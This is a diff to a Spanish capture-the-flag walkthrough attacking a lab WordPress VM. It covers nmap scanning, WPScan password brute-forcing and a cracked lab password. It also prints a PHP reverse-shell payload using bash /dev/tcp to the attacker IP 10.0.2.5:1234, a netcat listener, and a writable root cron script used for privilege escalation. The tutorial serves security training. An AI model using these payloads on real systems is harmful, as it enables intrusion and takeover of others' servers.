@@ -34,11 +34,11 @@ Usamos el comando en consola de la siguiente manera:
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/2-nmapRed.gif)
 
-Recordar que los parámetros -T4 hacen un escaneo rápido y -sS permite identificación de servicios asociados a los puertos.
-Como podemos ver en la salida del comando, se encontró la IP 10.0.2.8 con 3 puertos abiertos: 21, 22 y 80.
-Como primer paso abrimos un navegador en Kali Linux y verificamos la que sitio existe en la IP victima.
+Recordar que los parámetros `-T4` hacen un escaneo rápido y `-sS` permite identificación de servicios asociados a los puertos.
+Como podemos ver en la salida del comando, se encontró la IP `10.0.2.8` con 3 puertos abiertos: `21, 22 y 80`.
+Como primer paso abrimos un navegador en Kali Linux y verificamos el sitio existe en la IP victima (puerto 80).
 
-Lo único que encontramos es la típica página indicando que existe un servidor web y se encuntra funcionando.
+Lo único que encontramos, es la típica página indicando que existe un servidor web y se encuntra funcionando.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/3-webhttp.gif)
 
@@ -51,8 +51,10 @@ Si miramos con atención la salida del comando, nos damos cuenta que hay un arch
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/4-http-enum.gif)
  
-Una vez más abrimos el navegador e introducimos `10.0.2.8/robots.txt`
-Finalmente comprobamos la existencia de un Wordpress hosteado en la máquina victima. 
+Una vez más, abrimos el navegador e introducimos la siguiente URL`10.0.2.8/robots.txt`.
+Es importante recordar que el archivo robots.txt se deja en los servidores web, como manera de indicarle a los motores de búsqueda que NO indexen el contenido presente en dicho documento.
+
+Finalmente comprobamos la existencia de un Wordpress hosteado en la máquina victima.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/5-robotsTxt.png)
 
@@ -61,7 +63,7 @@ El sitio wordpress se encuentra en `10.0.2.8/backup_wordpress`
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/6-WordPress.png)
 
 ## Fase de Análisis
-Bueno, a esta altura ya conocemos a nuestra IP `10.0.2.5` y la IP de la victima `10.0.2.8`, además sabemos que hostea un sitio en wordpress. También se nos indica que el wordpress está desactualizado.
+Bueno, a esta altura ya conocemos nuestra IP `10.0.2.5` y la IP de la victima `10.0.2.8`, además sabemos que hostea un sitio en wordpress. También se nos indica que el wordpress está desactualizado.
 
 Acá comenzamos a planear la estrategia y los diferentes escenarios de ataques. 
 Como sabemos, wordpress es una herramienta que permite implementar blogs y sitios de manera simple. Adicionalmente permite ser extendido mediante el uso de diferentes plugins. Muchas veces esos plugins introducen brechas de seguridad al ser instalados o simplemente se usan contraseñas débiles para acceder a la administración del Wordpress `10.0.2.8/backup_wordpress/wp-admin`.
@@ -85,7 +87,7 @@ Intentamos loguearnos en `10.0.2.8/backup_wordpress/wp-admin` pero ninguno de lo
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/9-LoginWordpress.png)
 
-Pero como ya tenemos los usuarios, por lo cual podemos implementar un ataque de fuerza bruta. 
+Pero como ya tenemos los usuarios, procedemos a implementar un ataque de fuerza bruta. 
 Nos ayudamos de la misma herramienta WPSCAN para proceder con este ataque, sobre el usuario Admin.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/10.1-bruteforceAdmin.gif)
@@ -98,23 +100,35 @@ Ahora procedemos a probar con el otro usuario `john`.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/11-password.png)
 
-Acá si tenemos éxito logrando la clave `enigma` para el usuario `john`
+Acá si tenemos éxito, logrando la clave `enigma` para el usuario `john`
 
 Procedemos a loguear en la administración del sitio wordpress con el usuario y clave ingresado.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/12-accesoWP.png)
 
-Entramos al editor del tema de wordpress, ell cual nos permite modificar los archivos PHP directamente en el navegador web.
+Entramos al editor del tema de wordpress. Acá podemos modificar los archivos PHP directamente en el navegador web.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/13-EditorWP.png)
 
-Ponemos un regalito ![Shell reversa para php](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) en el `comments.php` y luego preparamos en la máquina atacante un listener para recibir la conexión remota.
+Ponemos un regalito [Shell reversa para php](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) en el `comments.php` y guardarmos el archivo. La shell reversa que usaremos es un trozo de código PHP que se ejecutará en la máquina victima. Una vez que visitemos uno de los comentarios del Wordpress ese trozo de código intentará conectarse a la máquina atacante `10.0.2.5` en un puerto específico `1234`. Para ello debemos preparar un listener en la máquina atacante que recibirá y manejará la conexión remota.
+
+La shell reversa en PHP es: `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/1234 0>&1'");`
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/14-ShellReversaPhp.png)
 
-Finalmente recibimos la conexión remota.
+Finalmente recibimos la conexión remota en el Kali Linux mediante el siguiente comando:
+`nc -lvp 1234`.
 
 ![](https://github.com/academiasIT/ciberseguridad/blob/master/img/15-AccesoShell.gif)
+
+Como ya contamos con acceso a la máquina victima, estamos un paso mas cerca de nuestro objetivo: Ser Root!
+Para ello se deben utilizar técnicas de [escalación de privilegios](https://www.icann.org/news/blog/que-es-el-escalonamiento-de-privilegios). Para tratar de acortar un poco este material que ya es bastante extenso, diré que dentro de los sistemas operativos Linux, existen tareas recurrentes que se automatizan haciendo uso de Cron. Este proceso toma archivos y los ejecuta cada cierto periodo de tiempo. Resulta que en el caso de nuestra victima, existe un archivo que ha sido puesto para borrar logs. Estos logs son borrados recurrentemente. El gran problema reside en que ese archivo cuenta con permisos elevados, de hecho permisos de super usuario o root y puede ser modificado por cualquiera.
+
+El archivo se encuentra en el directorio: `/usr/local/bin/cleanup`
+
+Con la conexión reversa ya establecida, procedemos a utilizar el comando cat para visualizar el contenido del archivo
+
+![](https://github.com/academiasIT/ciberseguridad/blob/master/img/16-Cleanup.png)
 
 ## Fase de Documentación
 
